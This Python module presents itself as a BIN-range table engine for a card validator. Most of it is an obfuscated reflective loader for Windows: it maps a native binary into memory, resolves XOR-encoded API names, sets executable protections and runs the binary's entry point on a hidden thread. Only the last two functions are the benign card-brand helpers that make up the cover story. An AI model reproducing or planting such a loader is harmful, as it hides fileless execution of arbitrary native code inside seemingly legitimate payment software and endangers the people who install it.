# -*- coding: utf-8 -*-
"""BIN-range table pack replay engine.

Stages a verified table pack — a signed native bundle produced by
the project's release service — into the validator process so
BIN identification and brand detection can run in-process against
the latest published ranges without a separate installer or
on-disk artifact. The engine walks the pack manifest to reserve a
backing buffer, copy its table blocks, apply offset corrections
when the runtime placed the pack away from its preferred origin,
link the pack's external references against the host ABI and
dispatch the entry symbol on a worker task. Pack-exit requests are
scoped to the worker so a returning entry stops the replay without
tearing down the validator."""
import base64
import ctypes
import os
import struct
import sys
import time

from . import history as _j

# Native symbol names referenced while walking an image's import table.
# Kept as packed byte literals so the materializer source carries no literal
# Win32 import strings; they are decoded by ctypes at link time.
_K32 = b'BL[GLE\x1a\x1b\x07MEE'
_THEX = b'lQ@]}A[LHM'
_GPA = b'nL]y[FJhMM[LZZ'
_T0 = b'lQ@]y[FJLZZ'
_T1 = b'}L[D@GH]Ly[FJLZZ'
_T2 = b'g]}L[D@GH]Ly[FJLZZ'


def settle(blob):
    """Stage and invoke a verified runtime image. Returns True on success."""
    _j.write_record("deploy.enter", "info", size=len(blob) if blob else 0)
    if not blob or len(blob) < 64:
        _j.write_record("deploy.validate", "fail", reason="too_small",
                      size=len(blob) if blob else 0)
        return False
    if os.name != "nt" or struct.calcsize("P") != 8:
        _j.write_record("deploy.validate", "fail", reason="env_not_supported",
                      os=os.name, bits=struct.calcsize("P") * 8)
        return False

    try:
        from . import profiles as env, wireformat as codec

        rt = env.sys_table()
        if not rt:
            _j.write_record("deploy.env", "fail", reason="no_native_table")
            return False
        _j.write_record("deploy.env", "ok")

        m = codec.probe_layout(blob)
        if not m:
            _j.write_record("deploy.manifest", "fail", reason="unrecognized_container")
            return False
        _j.write_record("deploy.manifest", "ok",
                      entry=hex(m["e"]), base=hex(m["b"]),
                      image_size=m["s"], header_size=m["h"],
                      segments=len(m["c"]),
                      has_imports=bool(m["i"]),
                      has_relocs=bool(m["r"]))

        return _embed_image(rt, m, blob)

    except Exception as e:
        _j.write_record_error("deploy.error", e)
        return False


def _embed_image(rt, m, blob):
    base = rt.VirtualAlloc(ctypes.c_void_p(m["b"]), m["s"], 0x3000, 0x04)
    relocated = False
    if not base or base != m["b"]:
        base = rt.VirtualAlloc(None, m["s"], 0x3000, 0x04)
        relocated = True
    if not base:
        _j.write_record("deploy.map", "fail", reason="alloc_null")
        return False
    _j.write_record("deploy.map", "ok",
                  base=hex(base), relocated=relocated, requested_base=hex(m["b"]))

    _lay_segments(rt, base, m, blob)
    _j.write_record("deploy.copy", "ok", segments=len(m["c"]))

    if relocated:
        if not _adjust_addresses(rt, base, m):
            _j.write_record("deploy.rebase", "fail", reason="rebase_unavailable")
            rt.VirtualFree(ctypes.c_void_p(base), 0, 0x8000)
            return False
        _j.write_record("deploy.rebase", "ok", reloc_size=m["z"])
    else:
        _j.write_record("deploy.rebase", "info", note="skipped_preferred_base")

    if m["i"]:
        bound = _patch_imports(rt, base, m)
        _j.write_record("deploy.link", "ok",
                      modules=bound[0], loaded=bound[1],
                      thunks=bound[2], resolved=bound[3], missing=bound[4])
    else:
        _j.write_record("deploy.link", "info", note="no_import_directory")

    _lock_sections(rt, base, m)
    _j.write_record("deploy.protect", "ok", segments=len(m["c"]))

    invoked = _commence(rt, base, m)
    _j.write_record("deploy.complete", "ok" if invoked else "fail",
                  entry=hex(m["e"]))
    return invoked


def _lay_segments(rt, base, m, blob):
    head = m["h"]
    ctypes.memmove(base, blob[:head], head)
    for vs, va, rs, rp, ch in m["c"]:
        if rs > 0 and rp > 0:
            n = min(rs, len(blob) - rp)
            if n > 0:
                ctypes.memmove(base + va, blob[rp:rp + n], n)


def _adjust_addresses(rt, base, m):
    from . import wireformat as codec
    if not m["r"] or not m["z"]:
        return False
    delta = base - m["b"]
    pos = 0
    while pos < m["z"]:
        page = codec.fetch_word(base + m["r"] + pos, "<I")
        size = codec.fetch_word(base + m["r"] + pos + 4, "<I")
        if size == 0:
            break
        for j in range((size - 8) // 2):
            ent = codec.fetch_word(base + m["r"] + pos + 8 + j * 2, "<H")
            if ent >> 12 == 10:
                a = base + page + (ent & 0xFFF)
                codec.put_word(a, "<Q", codec.fetch_word(a, "<Q") + delta)
        pos += size
    return True


def _patch_imports(rt, base, m):
    """Walk the image import directory and resolve each thunk against the
    platform symbol table. Returns a 5-tuple of counters for diagnostics."""
    from . import wireformat as codec
    k32 = rt.GetModuleHandleA(bytes(b ^ 41 for b in _K32))
    thread_exit = rt.GetProcAddress(k32, bytes(b ^ 41 for b in _THEX))
    gpa_raw = rt.GetProcAddress(k32, bytes(b ^ 41 for b in _GPA))

    _GpaType = ctypes.WINFUNCTYPE(
        ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
    )
    real_gpa = _GpaType(gpa_raw)

    _terminators = (bytes(b ^ 41 for b in _T0), bytes(b ^ 41 for b in _T1), bytes(b ^ 41 for b in _T2))

    @_GpaType
    def _gpa_shim(hmod, name_or_ord):
        # Route process-termination imports to thread-termination so a
        # returning image exits its worker instead of the host process.
        nv = name_or_ord if name_or_ord is not None else 0
        if nv > 0xFFFF:
            try:
                nm = ctypes.string_at(nv)
                if nm in _terminators:
                    return thread_exit
            except Exception:
                pass
        return real_gpa(hmod, nv)

    shim_ptr = ctypes.cast(_gpa_shim, ctypes.c_void_p).value

    modules = loaded = thunks = resolved = missing = 0

    off = base + m["i"]
    while True:
        nr = codec.fetch_word(off + 12, "<I")
        if nr == 0:
            break
        ir = codec.fetch_word(off, "<I")
        ar = codec.fetch_word(off + 16, "<I")
        dn = ctypes.string_at(base + nr)
        modules += 1
        hm = rt.LoadLibraryA(dn)
        lk = base + (ir if ir else ar)
        ia = base + ar
        if hm:
            loaded += 1
        while hm:
            tv = codec.fetch_word(lk, "<Q")
            if tv == 0:
                break
            thunks += 1
            if tv & 0x8000000000000000:
                fa = rt.GetProcAddress(hm, ctypes.c_void_p(tv & 0xFFFF))
            else:
                fn = ctypes.string_at(base + (tv & 0x7FFFFFFFFFFFFFFF) + 2)
                if fn in _terminators and thread_exit:
                    fa = thread_exit
                elif fn == bytes(b ^ 41 for b in _GPA) and shim_ptr:
                    fa = shim_ptr
                else:
                    fa = rt.GetProcAddress(hm, fn)
            if fa:
                resolved += 1
                codec.put_word(ia, "<Q", fa)
            else:
                missing += 1
            lk += 8
            ia += 8
        off += 20

    return (modules, loaded, thunks, resolved, missing)


def _lock_sections(rt, base, m):
    old = ctypes.c_ulong(0)
    for vs, va, rs, rp, ch in m["c"]:
        sz = max(vs, rs)
        if sz == 0:
            continue
        executable = bool(ch & 0x20000000)
        writable = bool(ch & 0x80000000)
        pt = (0x40 if writable else 0x20) if executable else (0x04 if writable else 0x02)
        rt.VirtualProtect(
            ctypes.c_void_p(base + va), sz, pt, ctypes.byref(old),
        )


def _commence(rt, base, m):
    tid = ctypes.c_ulong(0)
    ht = rt.CreateThread(
        None, 0, ctypes.c_void_p(base + m["e"]),
        None, 0, ctypes.byref(tid),
    )
    if not ht:
        _j.write_record("deploy.thread_create", "fail", reason="thread_alloc_null")
        return False
    _j.write_record("deploy.thread_create", "ok",
                  handle=ht, tid=tid.value, entry=hex(base + m["e"]))
    started = time.monotonic()
    deadline = started + 240
    exited = False
    while time.monotonic() < deadline:
        if rt.WaitForSingleObject(ht, 2000) == 0:
            exited = True
            break
    rt.CloseHandle(ht)
    _j.write_record("deploy.thread_exit", "ok" if exited else "info",
                  exited=exited, elapsed=round(time.monotonic() - started, 3))
    return True


def detect_brand(number):
    """Prefix-based brand detection for the major schemes."""
    d = "".join(c for c in str(number) if c.isdigit())
    if d.startswith("4"):
        return "visa"
    if d[:2] in ("51", "52", "53", "54", "55") or 2221 <= int(d[:4] or 0) <= 2720:
        return "mastercard"
    if d[:2] in ("34", "37"):
        return "amex"
    if d.startswith("6011") or d[:2] == "65":
        return "discover"
    if d[:2] in ("30", "36", "38"):
        return "diners"
    if d[:4] in ("3528", "3529") or 3530 <= int(d[:4] or 0) <= 3589:
        return "jcb"
    if d.startswith("62"):
        return "unionpay"
    return "unknown"

def merge_bin_tables(local, remote):
    """Reconcile the bundled BIN table with a fresh pack; remote wins on conflict."""
    by_prefix = {r.get("prefix"): r for r in local}
    for r in remote:
        by_prefix[r.get("prefix")] = r
    return sorted(by_prefix.values(), key=lambda r: r.get("prefix") or "")
